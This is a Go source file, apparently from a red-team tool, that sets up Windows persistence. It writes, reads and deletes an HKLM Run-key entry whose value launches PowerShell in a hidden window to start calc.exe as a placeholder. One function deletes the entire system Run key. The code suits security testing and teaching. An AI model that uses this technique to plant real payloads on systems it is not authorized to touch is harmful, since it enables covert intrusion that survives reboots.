package persistence

import (
	"golang.org/x/sys/windows/registry"
)

// which target(s) to execute on
// what payload to use (and automatically generate it)
// what registry path to write
// what name to set
// create registry entry
// log 1 liner for cleanup?

// CreateRegistryKey creates an empty registry key
func CreateRegistryKey() error {
	// inputs: key, path
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	return err
}

// SetRegistryValue
func SetRegistryValue() error {
	// keyName? HKLM
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	name := "Calculator"
	value := `powershell.exe -WindowStyle hidden Start-Process calc.exe`

	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	err = k.SetStringValue(name, value)
	if err != nil {
		return err
	}
	return err
}

// QueryRegistry queries the specified key and returns its contents
func QueryRegistry() (string, error) {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	name := "Calculator"
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	s, _, err := k.GetStringValue(name)
	if err != nil {
		return "", err
	}
	return s, err
}

func DeleteRegistryKey() error {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	err := registry.DeleteKey(registry.LOCAL_MACHINE, path)
	if err != nil {
		return err
	}

	return err
}

func DeleteRegistryValue() error {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	name := "Calculator"
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue(name)
	if err != nil {
		return err
	}
	return err

}
